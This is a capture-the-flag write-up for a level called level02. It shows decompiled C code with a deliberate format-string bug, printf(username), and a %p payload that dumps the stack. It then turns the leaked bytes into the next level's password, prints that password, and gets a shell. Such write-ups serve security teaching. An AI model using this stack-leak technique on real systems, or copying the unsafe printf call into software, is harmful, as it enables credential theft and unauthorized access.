# Level02
## Code
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main(int argc, const char **argv, const char **envp)
{
  char password[96]; 
  int clue1; 
  char ptr[48]; 
  int clue2; 
  char username[96]; 
  int clue3; 
  FILE *stream; 

  memset(username, 0, sizeof(username));
  clue2 = 0;
  memset(ptr, 0, 41);
  memset(password, 0, sizeof(password));
  clue1 = 0;
  stream = 0LL;
  clue3 = 0;
  stream = fopen("/home/users/level03/.pass", "r");
  if ( !stream )
  {
    fwrite("ERROR: failed to open password file\n", 1uLL, 0x24uLL, stderr);
    exit(1);
  }
  clue3 = fread(ptr, 1uLL, 0x29uLL, stream);
  ptr[strcspn(ptr, "\n")] = 0;
  if ( clue3 != 41 )
  {
    fwrite("ERROR: failed to read password file\n", 1uLL, 0x24uLL, stderr);
    fwrite("ERROR: failed to read password file\n", 1uLL, 0x24uLL, stderr);
    exit(1);
  }
  fclose(stream);
  puts("===== [ Secure Access System v1.0 ] =====");
  puts("/***************************************\\");
  puts("| You must login to access this system. |");
  puts("\\**************************************/");
  printf("--[ Username: ");
  fgets(username, 100, stdin);
  username[strcspn(username, "\n")] = 0;
  printf("--[ Password: ");
  fgets(password, 100, stdin);
  password[strcspn(password, "\n")] = 0;
  puts("*****************************************");
  if ( strncmp(ptr, password, 41) )
  {
    printf(username);
    puts(" does not have access!");
    exit(1);
  }
  printf("Greetings, %s!\n", username);
  system("/bin/sh");
  return 0;
}
```
## Explanation
- This program opens the `.pass` file and writes its content into ptr.

- Then it gets user input for username and password.

- Finally, it compares the password with the content of ptr, so clearly we understand that the password is the .`.pass`'s content itself.

- The thing is when you input a wrong password, the error message calls `printf()` to display the username directly, which is a huge security breach since it allows you to explore the stack by inserting %X or %p specifiers in your username : `printf()` will try to reach the arguments where they should be even if they don't exist.

- So if you try this :
```
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAAAAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
--[ Password: BBBBBBBB
*****************************************
AAAAAAAA 0x7fffffffe4e0 (nil) 0x42 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6d8 0x1f7ff9a08 0x4242424242424242 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x4141414141414141 does not have access!

```
- printf reads everything on the stack by making a new 8 bytes jump (and not 4 because this program is a 64bit ELF) at every `%p` specifier. So if we look at the result, we can quite clearly see all the variables declared in the stack at the beginning of the program, we can see:

    - our password represented by `0x4242424242424242`, followed by quite a lot of null bytes, which can be explained by the call to `memset()`, this is the rest of our password buffer.

    - the start of our username string represented by `0x4141414141414141`

    - Between these two, and judging by the order in which the variables were declared, we can guess that the content of the `ptr` buffer is right there in the mddle, surrounded by the two `(nil)` of the clue int variables set to 0 in the code.

- All that's left to do is convert these 5 packs of 8 bytes to ASCII and put them back in the right order to get the password :

    - raw output : `0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d`

    - conversion to ASCII : `unPR47hH EAJ5as9Q 7zqCWNgX 5J5hnGXs H3gPfK9M`

    - reversed final version : `Hh74RPnu Q9sa5JAE XgNWCqz7 sXGnh5J5 M9KfPg3H`

    - whitespaces removed : `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`
## Exploit

```
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: osef
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, osef!
$ whoami
level03

```
